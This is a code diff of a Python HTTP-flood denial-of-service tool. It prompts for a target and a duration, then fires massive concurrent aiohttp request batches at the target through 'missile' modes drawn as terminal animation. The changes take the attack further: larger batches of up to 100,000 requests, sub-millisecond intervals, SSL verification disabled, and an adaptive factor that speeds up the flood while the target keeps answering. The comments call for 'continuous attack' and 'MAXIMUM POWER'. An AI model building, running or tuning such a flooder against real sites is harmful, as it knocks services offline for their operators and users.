@@ -4,7 +4,6 @@ import random
 import time
 import os
 import shutil
-import psutil
 
 # Terminal size
 TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
@@ -45,42 +44,30 @@ EXHAUST_FRAMES = [
     "\033[93m ::: \033[0m"
 ]
 
-# Dynamic batch sizes based on system resources
-def get_dynamic_batch_size(missile_type):
-    # Get system resources
-    cpu_percent = psutil.cpu_percent(interval=0.1)
-    memory = psutil.virtual_memory()
-    memory_percent = memory.percent
+# Maximum batch sizes for each missile type (optimized for Termux)
+MISSILE_BASE_SIZES = {
+    1: 2000,   # Light missile - high frequency
+    2: 5000,   # Medium missile
+    3: 10000,  # Heavy missile
+    4: 20000,  # Super missile
+    5: 50000   # Ultra missile - maximum power
+}
+
+# Global request counter and performance tracking
+total_requests = 0
+requests_lock = asyncio.Lock()
+performance_factor = 1.0
+
+# Adaptive batch sizing based on recent performance
+async def get_dynamic_batch_size(missile_type):
+    global performance_factor
     
-    # Base sizes for each missile type
-    base_sizes = {
-        1: 1000,   # Light missile - high frequency
-        2: 5000,   # Medium missile
-        3: 10000,  # Heavy missile
-        4: 25000,  # Super missile
-        5: 50000   # Ultra missile - maximum power
-    }
+    base_size = MISSILE_BASE_SIZES.get(missile_type, 1000)
     
-    base_size = base_sizes.get(missile_type, 1000)
+    # Adjust based on performance factor (starts at 1.0)
+    dynamic_size = int(base_size * performance_factor)
     
-    # Adjust based on available resources
-    if cpu_percent < 50 and memory_percent < 70:
-        # System has plenty of resources - go aggressive
-        multiplier = 3.0
-    elif cpu_percent < 80 and memory_percent < 85:
-        # System has moderate resources
-        multiplier = 2.0
-    else:
-        # System is stressed - be conservative
-        multiplier = 1.0
-    
-    # Type 5 (Ultra) gets extra boost if resources allow
-    if missile_type == 5 and cpu_percent < 60 and memory_percent < 75:
-        multiplier *= 1.5
-    
-    dynamic_size = int(base_size * multiplier)
-    
-    # Cap extremely high values
+    # Cap sizes to prevent memory issues
     max_sizes = {
         1: 5000,
         2: 15000,
@@ -90,10 +77,6 @@ def get_dynamic_batch_size(missile_type):
     }
     
     return min(dynamic_size, max_sizes[missile_type])
-
-# Global request counter
-total_requests = 0
-requests_lock = asyncio.Lock()
 
 class Missile:
     def __init__(self, speed=None):
@@ -105,11 +88,11 @@ class Missile:
         else:
             self.speed = random.choice([1, 2, 3, 4, 5])
         
-        self.batch = get_dynamic_batch_size(self.speed)
+        self.batch = MISSILE_BASE_SIZES.get(self.speed, 1000)
         self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
         self.y = TERMINAL_HEIGHT
         self.active = False
-        self.launch_delay = random.uniform(0.5, 2)  # Faster launches
+        self.launch_delay = random.uniform(0.3, 1.5)  # Much faster launches
         self.exhaust = random.choice(EXHAUST_FRAMES)
         self.requests_sent = 0
         self.last_batch_time = 0
@@ -121,19 +104,14 @@ class Missile:
                 self.reset()
                 self.active = False
 
-# Draw missiles with dynamic batch sizes and system info
+# Draw missiles with dynamic batch sizes
 def draw_missiles(missiles):
-    global total_requests
-    
-    # Get system info
-    cpu_percent = psutil.cpu_percent(interval=0.1)
-    memory = psutil.virtual_memory()
-    memory_percent = memory.percent
+    global total_requests, performance_factor
     
     buffer = [""] * TERMINAL_HEIGHT
     
-    # System info at top
-    buffer[0] = f"CPU: {cpu_percent:.1f}% | MEM: {memory_percent:.1f}% | REQS: {total_requests}"
+    # System info at top (simplified without psutil)
+    buffer[0] = f"PERF: {performance_factor:.1f}x | TOTAL REQUESTS: {total_requests}"
     buffer[1] = "=" * TERMINAL_WIDTH
     
     for missile in missiles:
@@ -178,10 +156,10 @@ def get_headers():
 
 # Send batch requests with maximum efficiency
 async def send_requests(target, batch, missile=None):
-    global total_requests
+    global total_requests, performance_factor
     
     connector = aiohttp.TCPConnector(limit=0, verify_ssl=False, use_dns_cache=True)
-    timeout = aiohttp.ClientTimeout(total=15)
+    timeout = aiohttp.ClientTimeout(total=10)  # Shorter timeout for faster cycles
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         tasks = []
@@ -215,88 +193,90 @@ async def send_requests(target, batch, missile=None):
             if missile:
                 missile.requests_sent += successful
             
+            # Adaptive performance adjustment
+            success_rate = successful / batch if batch > 0 else 0
+            if success_rate > 0.8:
+                # Increase performance factor if we're doing well
+                performance_factor = min(performance_factor * 1.1, 3.0)
+            elif success_rate < 0.3:
+                # Decrease if we're struggling
+                performance_factor = max(performance_factor * 0.9, 0.5)
+            
             return successful
         except Exception as e:
+            # Decrease performance factor on exception
+            performance_factor = max(performance_factor * 0.8, 0.5)
             return 0
 
 # Continuous attack functions for each missile type
 async def send_continuous_requests(target, missile):
+    global performance_factor
+    
     missile.requests_sent = 0
     flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05
     
     start_time = time.time()
     
     while time.time() - start_time < flight_time and missile.active:
-        # Dynamic batch size adjustment during flight
-        missile.batch = get_dynamic_batch_size(missile.speed)
+        # Get dynamic batch size based on current performance
+        missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
         
-        # Send requests based on missile type
-        if missile.speed == 1:  # High frequency, smaller batches
-            batch_size = max(100, missile.batch // 10)
-            interval = 0.001  # 1ms
-        elif missile.speed == 2:  # Balanced
-            batch_size = max(500, missile.batch // 5)
-            interval = 0.002
-        elif missile.speed == 3:  # Heavy
-            batch_size = max(1000, missile.batch // 3)
-            interval = 0.005
-        elif missile.speed == 4:  # Super
-            batch_size = max(2000, missile.batch // 2)
-            interval = 0.01
-        else:  # Ultra (Type 5) - Maximum power
-            batch_size = missile.batch
-            interval = 0.02  # Larger batches, slightly longer intervals
+        # Send requests based on missile type with optimized intervals
+        intervals = {
+            1: 0.001,  # 1ms - high frequency
+            2: 0.002,  # 2ms
+            3: 0.003,  # 3ms
+            4: 0.005,  # 5ms
+            5: 0.008   # 8ms - larger batches
+        }
+        
+        interval = intervals[missile.speed]
+        batch_size = min(missile.batch, 10000)  # Cap single batch size
         
         batch_start = time.time()
         successful = await send_requests(target, batch_size, missile)
         
-        # Adaptive timing based on performance
+        # Adaptive timing
         batch_duration = time.time() - batch_start
-        if successful > 0 and batch_duration < interval:
-            # We can go faster
-            interval = max(0.0005, batch_duration * 0.8)
-        
-        sleep_time = max(0, interval - batch_duration)
-        if sleep_time > 0:
-            await asyncio.sleep(sleep_time)
+        sleep_time = max(0.0001, interval - batch_duration)  # Minimum 0.1ms sleep
+        await asyncio.sleep(sleep_time)
 
-# Special attack modes
+# Special attack modes - MAXIMUM POWER
 async def ultra_super_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        batch = get_dynamic_batch_size(4) * 3  # Triple super missile power
+        batch = 50000  # Massive batches
         asyncio.create_task(send_requests(target, batch))
-        await asyncio.sleep(3)  # More frequent
+        await asyncio.sleep(1)  # Very frequent
 
 async def last_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        batch = get_dynamic_batch_size(5) // 2  # Half ultra missile power but frequent
+        batch = 20000  # Large frequent batches
         asyncio.create_task(send_requests(target, batch))
-        await asyncio.sleep(0.1)  # Very frequent
+        await asyncio.sleep(0.05)  # Extremely frequent
 
 async def supernova_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        delay = random.uniform(2, 5)  # More frequent supernovas
+        delay = random.uniform(1, 3)  # Very frequent supernovas
         await asyncio.sleep(delay)
 
         # Massive initial burst
-        initial_batch = get_dynamic_batch_size(5) * 5
+        initial_batch = 100000
         asyncio.create_task(send_requests(target, initial_batch))
 
-        # Continuous stream
+        # Continuous ultra-high frequency stream
         async def stream():
-            t_end = time.time() + 3  # Longer stream
+            t_end = time.time() + 5  # Longer stream
             while time.time() < t_end:
-                stream_batch = get_dynamic_batch_size(3)
-                asyncio.create_task(send_requests(target, stream_batch))
-                await asyncio.sleep(0.0005)  # Very high frequency
+                asyncio.create_task(send_requests(target, 5000))
+                await asyncio.sleep(0.0001)  # Ultra high frequency
         asyncio.create_task(stream())
 
 # Main loop
 async def main():
-    global total_requests
+    global total_requests, performance_factor
     
     target = input("¿TARGZ > ")
     duration = int(input("¿DU > "))
@@ -321,16 +301,16 @@ async def main():
                 missile.active = True
                 last_launch_times[idx] = now
                 
-                # Update batch size based on current resources
-                missile.batch = get_dynamic_batch_size(missile.speed)
+                # Update batch size based on current performance
+                missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
                 
-                # All missiles use continuous attack now
+                # All missiles use continuous attack
                 asyncio.create_task(send_continuous_requests(target, missile))
             
             missile.move()
         
         draw_missiles(missiles)
-        await asyncio.sleep(0.03)  # Faster update for smoother animation
+        await asyncio.sleep(0.02)  # Very fast update for maximum performance
 
 if __name__ == "__main__":
     try:
